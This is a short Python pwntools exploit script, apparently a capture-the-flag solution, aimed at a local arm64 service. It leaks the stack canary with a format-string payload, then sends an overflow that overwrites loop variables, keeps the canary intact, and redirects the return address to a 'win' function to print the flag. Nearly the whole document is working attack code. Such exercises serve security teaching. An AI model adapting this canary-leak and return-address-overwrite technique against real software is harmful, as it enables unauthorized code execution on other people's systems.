#!/usr/bin/env python3
from pwn import *

host = "127.0.0.1" 
port = "50136"

conn = remote(host, port)

BUFFER_LEN = 8
PADDING_LEN = 6
WIN_ADDR = 0x400c84

# Step 1 Leak canary
payload = b"%12$lu" # local canary stored at the 12th argument on arm64
print(conn.recv())
conn.sendline(payload)

print(conn.recv())
print(conn.recvuntil("\n"))

canary = conn.recvuntil("\n")
canary = int(canary.rstrip(b'\r\n'))
print("Canary: " + str(canary))

# Step 2 Overwrite i and run to finish while loop
#        Overwrite canary and return address with address to win
payload = b"A" * BUFFER_LEN
payload += b"U" * PADDING_LEN
payload += b"B"                 # i
payload += b"B"                 # run - overwrite to end the while look
payload += p64(canary)          # overwrite local_canary
payload += b"U" * 8             # padding
payload += p64(WIN_ADDR)        # overwrite the return address

conn.recv()
conn.sendline(payload)

conn.recvuntil("flag: ")
print(conn.recv())
conn.close()
